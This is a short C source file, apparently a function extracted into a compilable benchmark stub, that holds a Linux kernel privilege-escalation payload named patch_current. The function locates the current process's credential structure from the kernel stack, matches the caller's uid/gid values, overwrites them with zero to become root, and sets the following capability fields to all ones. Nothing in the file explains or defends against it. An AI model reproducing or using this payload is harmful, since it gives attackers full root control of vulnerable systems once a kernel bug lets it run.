#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */

/* Variables and functions */
 int /*<<< orphan*/  ugid ; 

void patch_current() {
        int i,j,k;
        char *current = *(char**)(((long)&i) & (-8192));
        long kbase = ((long)current)>>36;

        for (i=0; i<4000; i+=4) {
                long *p = (void *)&current[i];
                int *t = (void*) p[0];
                if ((p[0] != p[1]) || ((p[0]>>36) != kbase)) continue;
                for (j=0; j<20; j++) {
      for (k = 0; k < 8; k++)
                          if (((int*)&ugid)[k%2] != t[j+k]) goto next;
                        for (i = 0; i < 8; i++) t[j+i] = 0;
                        for (i = 0; i < 10; i++) t[j+9+i] = -1;
                        return;
next:;          }
        }
}